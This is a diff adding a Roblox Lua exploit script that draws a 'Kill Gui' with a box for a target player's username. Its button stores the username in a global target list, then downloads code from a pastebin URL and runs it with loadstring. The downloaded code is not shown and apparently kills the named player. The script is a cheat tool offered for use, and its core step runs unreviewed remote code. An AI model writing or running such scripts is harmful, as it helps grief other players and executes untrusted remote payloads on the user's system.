@@ -1,0 +1,60 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Kill = Instance.new("TextButton")
+local UserBox = Instance.new("TextBox")
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.197541669, 0, 0.385516495, 0)
+Frame.Size = UDim2.new(0, 388, 0, 321)
+Frame.Visible = true
+Frame.Active = true
+Frame.Draggable = true
+
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 0
+Title.Size = UDim2.new(0, 388, 0, 50)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "Kill Gui"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+Kill.Name = "Kill"
+Kill.Parent = Frame
+Kill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Kill.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Kill.BorderSizePixel = 0
+Kill.Position = UDim2.new(0.0721649453, 0, 0.753894091, 0)
+Kill.Size = UDim2.new(0, 332, 0, 61)
+Kill.Font = Enum.Font.SourceSans
+Kill.Text = "Frick em'"
+Kill.TextColor3 = Color3.fromRGB(0, 0, 0)
+Kill.TextSize = 14.000
+Kill.MouseButton1Down:Connect(function()
+	getgenv().Targets = {UserBox.Text}
+	loadstring(game:HttpGet('https://pastebin.com/raw/QqJ5b4L0'))()
+end)
+
+UserBox.Name = "UserBox"
+UserBox.Parent = Frame
+UserBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UserBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+UserBox.BorderSizePixel = 0
+UserBox.Position = UDim2.new(0.0463917516, 0, 0.302180678, 0)
+UserBox.Size = UDim2.new(0, 352, 0, 102)
+UserBox.Font = Enum.Font.SourceSans
+UserBox.PlaceholderText = "Enter the username"
+UserBox.Text = ""
+UserBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+UserBox.TextSize = 35.000
